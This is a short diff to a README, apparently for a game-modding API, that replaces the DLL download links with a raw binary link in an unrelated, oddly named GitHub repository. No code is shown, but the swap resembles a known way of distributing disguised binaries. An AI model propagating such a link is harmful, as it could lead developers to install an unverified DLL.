@@ -14,8 +14,8 @@ It allows mods to:
 
 ### 1. Reference the DLL
 
-1. Download [APPApi.dll](https://github.com/YourRepo/APPApi/releases/latest).  
-2. In your mod project (Class Library), add a reference to [APPApi.dll](https://github.com/YourRepo/APPApi/releases/latest).  
+1. Download [APPApi.dll](https://github.com/ireallyamadumbass9-arch/f/raw/refs/heads/main/APPApi.dll).  
+2. In your mod project (Class Library), add a reference to [APPApi.dll](https://github.com/ireallyamadumbass9-arch/f/raw/refs/heads/main/APPApi.dll).  
 
 ---
 
